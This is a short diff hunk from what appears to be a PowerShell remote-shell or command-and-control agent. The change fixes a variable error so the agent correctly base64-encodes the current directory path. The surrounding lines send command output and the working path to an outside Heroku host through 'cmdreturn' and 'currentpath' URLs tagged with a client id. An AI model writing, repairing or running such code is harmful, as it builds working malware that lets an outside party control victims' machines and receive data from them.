@@ -157,7 +157,7 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($out)
 $encoded = [Convert]::ToBase64String($Bytes)
 
 $Bytess = [System.Text.Encoding]::Unicode.GetBytes((Get-Location))
-$encodeds = [Convert]::ToBase64String($Bytes)
+$encodedd = [Convert]::ToBase64String($Bytess)
 
 $WebClient.DownloadString("http://y44v5ltr.herokuapp.com/rs/cmdreturn/" + $id + "/" + $encoded)
 $WebClient.DownloadString("http://y44v5ltr.herokuapp.com/rs/currentpath/" + $id + "/" + $encodedd)
